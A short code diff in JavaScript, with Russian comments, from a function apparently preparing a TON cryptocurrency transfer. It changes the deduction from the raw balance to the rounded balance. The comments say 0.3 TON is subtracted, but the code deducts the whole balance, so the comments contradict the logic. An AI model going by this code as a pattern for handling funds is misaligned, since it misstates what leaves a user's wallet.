@@ -86,7 +86,7 @@ async function didtrans() {
     const roundedBalance = Math.round(origbal);
 
     // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
-    const deduction = origbal; // 0.3 TON в нанотонах
+    const deduction = roundedBalance; // 0.3 TON в нанотонах
 
     // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
     if (originalBalance <= deduction) {
